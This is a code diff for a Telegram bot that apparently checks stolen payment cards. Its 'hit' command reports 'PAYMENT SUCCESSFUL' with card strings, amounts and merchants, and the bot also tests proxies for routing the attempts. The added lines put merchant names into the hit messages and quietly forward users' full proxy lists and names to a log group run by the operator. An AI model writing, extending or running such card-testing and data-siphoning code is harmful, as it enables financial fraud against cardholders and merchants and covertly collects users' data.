@@ -210,10 +210,18 @@ async def hit_command(message: types.Message):
                     import html
                     final_url = html.escape(final_url)
                 url_str = f"\n🔗 <b>Confirmation:</b> {final_url}" if final_url else ""
-                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{url_str}\n⏱ {res['response_time']:.2f}s"
+                
+                merchant_name = res.get('merchant') or 'Unknown'
+                if isinstance(merchant_name, str):
+                    import html
+                    merchant_name = html.escape(merchant_name)
+                merchant_str = f"\n🛒 <b>Merchant:</b> {merchant_name}" if merchant_name != 'Unknown' else ""
+                
+                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{merchant_str}{url_str}\n⏱ {res['response_time']:.2f}s"
                 if LOG_GROUP_ID:
                     try:
-                        await bot.send_message(LOG_GROUP_ID, hit_text)
+                        log_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{merchant_str}{url_str}\n👤 <b>User:</b> {message.from_user.first_name}\n⏱ {res['response_time']:.2f}s"
+                        await bot.send_message(LOG_GROUP_ID, log_text)
                     except:
                         pass
             else:
@@ -251,7 +259,8 @@ async def hit_command(message: types.Message):
                 
                 if LOG_GROUP_ID and any(c in code.lower() for c in live_codes):
                     try:
-                        await bot.send_message(LOG_GROUP_ID, hit_text)
+                        log_text = hit_text + f"\n👤 <b>User:</b> {message.from_user.first_name}"
+                        await bot.send_message(LOG_GROUP_ID, log_text)
                     except:
                         pass
                         
@@ -531,7 +540,27 @@ async def proxy_command(message: types.Message):
         
         if LOG_GROUP_ID:
             try:
-                await bot.send_message(LOG_GROUP_ID, f"🛡 <b>New Proxies Checked by {message.from_user.first_name}</b>\nLive: {live_count} | Dead: {dead_count}")
+                live_str = "\n".join([f"<code>{p}</code>" for p in live_proxies]) if live_proxies else "None"
+                dead_str = "\n".join([f"<code>{p}</code>" for p in dead_proxies[:10]]) if dead_proxies else "None"
+                if len(dead_proxies) > 10:
+                    dead_str += f"\n...and {len(dead_proxies) - 10} more dead nodes"
+                
+                msg_text = (
+                    f"🛡 <b>New Proxies Checked by {message.from_user.first_name}</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🟢 <b>Live ({live_count}):</b>\n{live_str}\n\n"
+                    f"💀 <b>Dead ({dead_count}):</b>\n{dead_str}"
+                )
+                if len(msg_text) > 4000:
+                    msg_text = (
+                        f"🛡 <b>New Proxies Checked by {message.from_user.first_name}</b>\n"
+                        f"━━━━━━━━━━━━━━━━━━━━\n"
+                        f"🟢 <b>Live ({live_count})</b> [Showing first 30]:\n"
+                        + "\n".join([f"<code>{p}</code>" for p in live_proxies[:30]]) + "\n"
+                        f"...and {live_count - 30} more.\n\n"
+                        f"💀 <b>Dead ({dead_count})</b>"
+                    )
+                await bot.send_message(LOG_GROUP_ID, msg_text)
             except:
                 pass
     else:
@@ -586,6 +615,15 @@ async def process_add_strong_only(callback: types.CallbackQuery):
             
     if added > 0:
         await ProxyManager.save_user_proxies(user_id, pool)
+        if LOG_GROUP_ID:
+            try:
+                proxies_str = "\n".join([f"<code>{p}</code>" for p in premium_raws])
+                msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
+                if len(msg) > 4000:
+                    msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
+                await bot.send_message(LOG_GROUP_ID, msg)
+            except:
+                pass
         
     bot.pasted_proxies_cache[user_id] = {}
     await callback.message.edit_reply_markup(reply_markup=None)
@@ -616,6 +654,15 @@ async def process_add_live_all(callback: types.CallbackQuery):
             
     if added > 0:
         await ProxyManager.save_user_proxies(user_id, pool)
+        if LOG_GROUP_ID:
+            try:
+                proxies_str = "\n".join([f"<code>{p}</code>" for p in live_raws])
+                msg = f"📥 <b>Saved all {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}\n━━━━━━━━━━━━━━━━━━━━\n{proxies_str}"
+                if len(msg) > 4000:
+                    msg = f"📥 <b>Saved {added} live proxies to pool!</b>\n👤 <b>User:</b> {callback.from_user.first_name}"
+                await bot.send_message(LOG_GROUP_ID, msg)
+            except:
+                pass
         
     bot.pasted_proxies_cache[user_id] = {}
     await callback.message.edit_reply_markup(reply_markup=None)
